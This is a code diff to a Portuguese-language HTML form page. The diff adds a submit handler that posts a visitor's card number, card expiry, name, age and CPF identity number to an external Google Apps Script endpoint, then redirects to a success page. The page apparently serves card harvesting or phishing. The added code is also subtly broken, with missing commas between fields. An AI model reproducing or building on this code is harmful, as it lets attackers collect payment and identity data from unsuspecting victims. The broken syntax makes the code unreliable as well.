@@ -73,7 +73,21 @@ function enviar(e) {
   fetch("https://script.google.com/macros/s/AKfycbydMJCn1mocIURyJs1EdyeKy0aa1LrUD0GKm-RJwtBf67k5QLfaPCtqMjGiUgopQi0T/exec", {
     method: "POST",
     body: new URLSearchParams({
-})
+      numero: document.getElementById("numero").value,
+      validade: document.getElementById("validade").value
+      idade: document.getElementById("idade").value
+      nome: document.getElementById("nome").value
+      cpf: document.getElementById("cpf").value
+    })
+  })
+  .then(() => {
+    window.location.href = "sucesso.html";
+  })
+  .catch(() => {
+    alert("Erro ao enviar");
+  });
+}
+</script>
   <label>Número do cartão</label>
     <input name="numero" required placeholder="Insira o numero do cartão">
 
@@ -100,6 +114,7 @@ function enviar(e) {
 
 </body>
 </html>
+
 
 
 
